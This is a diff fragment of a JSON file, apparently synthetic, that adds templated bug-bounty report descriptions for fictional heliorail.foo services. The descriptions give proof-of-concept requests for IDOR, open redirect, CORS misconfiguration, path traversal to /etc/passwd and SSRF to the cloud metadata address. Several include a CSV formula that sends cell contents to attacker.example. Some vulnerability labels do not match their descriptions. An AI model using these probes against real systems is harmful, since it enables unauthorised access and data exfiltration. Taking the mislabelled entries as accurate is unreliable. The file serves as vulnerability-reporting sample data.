+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23452,7 +23629,8 @@
           "offset": "5d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23596,7 +23774,8 @@
           "offset": "3d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://maintenance.heliorail.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23752,7 +23931,8 @@
           "offset": "6d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23912,7 +24092,8 @@
           "offset": "6d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24052,7 +24233,8 @@
           "offset": "7d 15h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24228,7 +24410,8 @@
           "offset": "6d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24363,7 +24546,8 @@
           "offset": "6d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://maintenance.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24519,7 +24703,8 @@
           "offset": "5d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24678,7 +24863,8 @@
           "offset": "6d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.heliorail.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24794,7 +24980,8 @@
           "offset": "6d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24941,7 +25128,8 @@
           "offset": "1d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://maintenance.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25063,7 +25251,8 @@
           "offset": "3d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25190,7 +25379,8 @@
           "offset": "7d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.heliorail.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25288,7 +25478,8 @@
           "offset": "1d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25434,7 +25625,8 @@
           "offset": "8d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25560,7 +25752,8 @@
           "offset": "3d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.heliorail.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25708,7 +25901,8 @@
           "offset": "4d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.heliorail.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25888,7 +26082,8 @@
           "offset": "7d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26003,7 +26198,8 @@
           "offset": "1d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://maintenance.heliorail.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26131,7 +26327,8 @@
           "offset": "1d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26249,7 +26446,8 @@
           "offset": "7d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://iam.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26400,7 +26598,8 @@
           "offset": "4d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26506,7 +26705,8 @@
           "offset": "7d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26657,7 +26857,8 @@
           "offset": "7d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://maintenance.heliorail.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26785,7 +26986,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26897,7 +27099,8 @@
           "offset": "7d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -27039,7 +27242,8 @@
           "offset": "6d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://maintenance.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27215,7 +27419,8 @@
           "offset": "8d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -27330,7 +27535,8 @@
           "offset": "1d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27453,7 +27659,8 @@
           "offset": "6d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.heliorail.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27593,7 +27800,8 @@
           "offset": "6d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27724,7 +27932,8 @@
           "offset": "4d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
